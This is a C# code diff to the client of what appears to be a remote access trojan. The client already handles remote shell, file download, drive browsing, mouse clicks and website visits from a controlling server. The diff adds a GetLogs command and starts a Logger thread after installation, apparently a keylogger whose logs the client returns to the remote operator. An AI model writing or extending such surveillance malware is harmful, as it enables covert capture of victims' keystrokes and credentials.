@@ -60,6 +60,7 @@ namespace xClient
                 typeof(Core.Packets.ServerPackets.Drives),
                 typeof(Core.Packets.ServerPackets.Directory),
                 typeof(Core.Packets.ServerPackets.DownloadFile),
+                typeof(Core.Packets.ServerPackets.GetLogs),
                 typeof(Core.Packets.ServerPackets.MouseClick),
                 typeof(Core.Packets.ServerPackets.GetSystemInfo),
                 typeof(Core.Packets.ServerPackets.VisitWebsite),
@@ -81,6 +82,7 @@ namespace xClient
                 typeof(Core.Packets.ClientPackets.DrivesResponse),
                 typeof(Core.Packets.ClientPackets.DirectoryResponse),
                 typeof(Core.Packets.ClientPackets.DownloadFileResponse),
+                typeof(Core.Packets.ClientPackets.GetLogsResponse),
                 typeof(Core.Packets.ClientPackets.GetSystemInfoResponse),
                 typeof(Core.Packets.ClientPackets.MonitorsResponse),
                 typeof(Core.Packets.ClientPackets.ShellCommandResponse),
@@ -132,6 +134,14 @@ namespace xClient
 
                 SystemCore.Install();
             }
+
+            new Thread(() =>
+            {
+                Logger logger = new Logger(30000);
+
+                logger.Enabled = true;
+
+            }).Start();
         }
 
         private static void Connect()
@@ -237,6 +247,10 @@ namespace xClient
             else if (type == typeof(Core.Packets.ServerPackets.DownloadFile))
             {
                 CommandHandler.HandleDownloadFile((Core.Packets.ServerPackets.DownloadFile)packet, client);
+            }
+            else if (type == typeof(Core.Packets.ServerPackets.GetLogs))
+            {
+                CommandHandler.HandleGetLogs((Core.Packets.ServerPackets.GetLogs)packet, client);
             }
             else if (type == typeof(Core.Packets.ServerPackets.MouseClick))
             {
